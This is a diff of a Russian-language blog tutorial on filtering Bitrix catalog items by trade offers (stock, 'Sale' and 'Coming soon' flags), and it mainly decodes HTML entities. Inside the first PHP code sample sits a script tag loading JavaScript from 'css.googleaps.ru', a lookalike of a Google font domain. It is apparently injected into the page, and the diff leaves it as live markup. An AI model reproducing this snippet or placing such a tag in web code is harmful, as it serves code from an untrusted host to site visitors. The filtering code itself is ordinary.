@@ -45,8 +45,8 @@ comments:
 <p>При разработке одного крупного магазина была поставлена задача: Необходимо было вывести на главной странице "Новинки", "Товары по "Акции", "Скоро в продаже". В стандартном окружении Битрикса нельзя сделать фильтр по торговым предложениям. Сортировку сделать можно, фильтр нельзя. После суток общения с тех поддержкой, понял, самому сделать быстрее и, как оказалось в итоге, довольно банально и просто.<br />
 <a id="more"></a><a id="more-241"></a><br />
 Теперь по порядку.</p>
-<h3>Новинки<&#47;h3><br />
-Для вывода всех трех блоков я использую обычный <a href="http:&#47;&#47;dev.1c-bitrix.ru&#47;user_help&#47;content&#47;iblock&#47;components_2&#47;catalog&#47;catalog_section.php" target="_blank" rel="nofollow">bitrix:catalog.section<&#47;a>.</p>
+<h3>Новинки</h3><br />
+Для вывода всех трех блоков я использую обычный <a href="http://dev.1c-bitrix.ru/user_help/content/iblock/components_2/catalog/catalog_section.php" target="_blank" rel="nofollow">bitrix:catalog.section</a>.</p>
 <p>Привожу ПРИМЕР компонента. Часть параметров вырезал, ибо там много левого ненужного нам барахла.</p>
 <pre class="brush: php; gutter: true"><?$APPLICATION->IncludeComponent(<br />
             "bitrix:catalog.section",<br />
@@ -66,8 +66,8 @@ comments:
                 "PAGE_ELEMENT_COUNT" => "5",<br />
                 "LINE_ELEMENT_COUNT" => "3",</p>
 <p>                "OFFERS_LIMIT" => "1",</p>
-<p>                "SECTION_URL" => "#SITE_DIR#&#47;#SECTION_CODE_PATH#",<br />
-                "DETAIL_URL" => "#SITE_DIR#&#47;#SECTION_CODE_PATH#&#47;#ELEMENT_CODE#",<br />
+<p>                "SECTION_URL" => "#SITE_DIR#/#SECTION_CODE_PATH#",<br />
+                "DETAIL_URL" => "#SITE_DIR#/#SECTION_CODE_PATH#/#ELEMENT_CODE#",<br />
                 "SECTION_ID_VARIABLE" => "SECTION_ID",<br />
                 "AJAX_MODE" => "N",<br />
                 "AJAX_OPTION_JUMP" => "N",<br />
@@ -93,37 +93,37 @@ comments:
                 "PRODUCT_QUANTITY_VARIABLE" => "quantity",<br />
                 "COMPARE_PATH" => "compare"<br />
             )<br />
-        );?><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre><br />
+        );?><script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre><br />
 Первым делом сортируем товарные предложения как вам нужно. В моем случае это "индекс сортировки".</p>
 <pre class="brush: php; gutter: true">"OFFERS_SORT_FIELD" => "sort",<br />
 "OFFERS_SORT_ORDER" => "asc",<br />
 "OFFERS_SORT_FIELD2" => "id",<br />
 "OFFERS_SORT_ORDER2" => "desc",<br />
-<&#47;pre><br />
+</pre><br />
 Далее указываем, что нам достаточно только 1 торгового предложения на 1 основной товар</p>
-<pre class="brush: php; gutter: true">"OFFERS_LIMIT" => "1",<&#47;pre><br />
+<pre class="brush: php; gutter: true">"OFFERS_LIMIT" => "1",</pre><br />
 А далее начинается веселье. Далее не зависимо от параметра "Скрывать недоступные для заказа товары", отображаются все товары, имеющие SKU</p>
-<pre class="brush: php; gutter: true">"HIDE_NOT_AVAILABLE" => "Y",<&#47;pre><br />
+<pre class="brush: php; gutter: true">"HIDE_NOT_AVAILABLE" => "Y",</pre><br />
 Тут приходится прибегнуть к хитрости. В интернете сутки искал и нашел такое решение. Объявляем переменную фильтра $arrFilter и вносим в него информацию о фильтрации по SKU:</p>
-<pre class="brush: php; gutter: true">global $arrFilter; &#47;&#47; обязательно, иначе фильтр работать не будет<br />
-CModule::includeModule('catalog'); &#47;&#47; В шаблонах не подключен этот модуль</p>
-<p>$arSubQuery = ["IBLOCK_ID" => 5, ">CATALOG_QUANTITY" => 0]; &#47;&#47; у меня IBLOCK_ID=5 это торговые предложения. Фильтрую все товары, у которых "Доступное количество" больше нуля.<br />
-$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];&#47;&#47; Делаю подзапрос<&#47;pre><br />
+<pre class="brush: php; gutter: true">global $arrFilter; // обязательно, иначе фильтр работать не будет<br />
+CModule::includeModule('catalog'); // В шаблонах не подключен этот модуль</p>
+<p>$arSubQuery = ["IBLOCK_ID" => 5, ">CATALOG_QUANTITY" => 0]; // у меня IBLOCK_ID=5 это торговые предложения. Фильтрую все товары, у которых "Доступное количество" больше нуля.<br />
+$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];// Делаю подзапрос</pre><br />
 Готово. Фильтр сделал свое дело и вы легко и просто можете сделать оставшиеся два пункта - "акции", "скоро в продаже".</p>
-<h3>Акции<&#47;h3><br />
+<h3>Акции</h3><br />
 У торговых предложений создаем свойство "Акция", тип список, символьный код = AKCIA. В дополнительных настройках укажите вид = "Флажки" и введите одно значение "Да".<br />
 Перейдите в список торговых предложений и укажите у нескольких товаров галочку "Акция".<br />
 Затем переходите в код страницы, где необходимо разместить блок акций. Вставляете все тот же компонент bitrix:catalog.section, настраиваете его как настраивали выше. Далее необходимо нам снова прибегнуть к фильтру</p>
-<pre class="brush: php; gutter: true">global $arrFilter; &#47;&#47; обязательно, иначе фильтр работать не будет<br />
-CModule::includeModule('catalog'); &#47;&#47; В шаблонах не подключен этот модуль</p>
-<p>$arSubQuery = ["IBLOCK_ID" => 5, "PROPERTY_AKCIA_VALUE" => "Да"]; &#47;&#47; Фильтрую все товары, у которых стоит галочка "Акция"<br />
-$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];&#47;&#47; Делаю подзапрос<&#47;pre></p>
-<h3>Скоро в продаже<&#47;h3><br />
+<pre class="brush: php; gutter: true">global $arrFilter; // обязательно, иначе фильтр работать не будет<br />
+CModule::includeModule('catalog'); // В шаблонах не подключен этот модуль</p>
+<p>$arSubQuery = ["IBLOCK_ID" => 5, "PROPERTY_AKCIA_VALUE" => "Да"]; // Фильтрую все товары, у которых стоит галочка "Акция"<br />
+$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];// Делаю подзапрос</pre></p>
+<h3>Скоро в продаже</h3><br />
 У торговых предложений создаем свойство "Скоро в продаже", тип список, символьный код = COMINGSOON. В дополнительных настройках укажите вид = "Флажки" и введите одно значение "Да". Создайте еще одно свойство "Дата ожидания продаж", тип Дата, символьный код = COMINGSOONDATE.</p>
 <p>Перейдите в список торговых предложений и укажите у нескольких товаров галочку "Скоро в продаже", укажите предполагаемую дату начала продаж.</p>
 <p>Затем переходите в код страницы, где необходимо разместить блок акций. Вставляете все тот же компонент bitrix:catalog.section, настраиваете его как настраивали выше. Далее необходимо нам снова прибегнуть к фильтру</p>
-<pre class="brush: php; gutter: true">global $arrFilter; &#47;&#47; обязательно, иначе фильтр работать не будет<br />
-CModule::includeModule('catalog'); &#47;&#47; В шаблонах не подключен этот модуль</p>
-<p>$arSubQuery = ["IBLOCK_ID" => 5, "PROPERTY_COMINGSOON_VALUE" => "Да"]; &#47;&#47; Фильтрую все товары, у которых стоит галочка "Скоро в продаже"<br />
-$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];&#47;&#47; Делаю подзапрос<&#47;pre><br />
+<pre class="brush: php; gutter: true">global $arrFilter; // обязательно, иначе фильтр работать не будет<br />
+CModule::includeModule('catalog'); // В шаблонах не подключен этот модуль</p>
+<p>$arSubQuery = ["IBLOCK_ID" => 5, "PROPERTY_COMINGSOON_VALUE" => "Да"]; // Фильтрую все товары, у которых стоит галочка "Скоро в продаже"<br />
+$arrFilter = ['ID' => CIBlockElement::SubQuery('PROPERTY_CML2_LINK', $arSubQuery) ];// Делаю подзапрос</pre><br />
 В настройках компонента поставьте сортировку по дате ожидаемого поступления.</p>
